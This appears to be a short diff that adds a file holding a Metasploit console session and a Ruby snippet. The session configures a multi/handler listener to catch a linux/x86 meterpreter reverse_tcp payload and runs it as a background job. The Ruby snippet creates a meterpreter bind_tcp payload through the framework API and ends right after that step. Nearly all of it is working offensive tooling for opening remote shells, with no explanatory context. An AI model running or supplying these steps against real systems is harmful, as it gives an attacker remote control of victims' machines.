@@ -1,0 +1,15 @@
+msf > use multi/handler
+msf exploit(handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+PAYLOAD => linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+msf exploit(handler) > set ExitOnSession False
+ExitOnSession => False
+msf exploit(handler) > exploit -j
+
+
+ruby --
+
+framework = Msf::Simple::Framework.create
+payload = framework.payloads.create("linux/x86/meterpreter/bind_tcp")
+
